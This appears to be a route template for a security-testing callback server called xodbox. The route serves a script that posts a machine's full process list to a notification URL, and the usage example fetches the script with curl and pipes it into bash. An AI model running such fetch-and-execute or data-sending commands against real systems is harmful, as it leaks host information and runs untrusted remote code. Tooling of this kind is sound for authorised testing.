---
title: Pipe Process List to Notifier
description: Simple script to pipe ps to the notification URL
weight: 1
pattern: /pipe.sh$
is_final: true
data:
  headers:
    Content-Type: text/plain
  body: |
    curl -d "$(ps aufx)" {{.Request.Host}}/{{ .NotifyString }}/pipe?status
---

### Example Request

```bash
curl xodbox/pipe.sh|bash
```
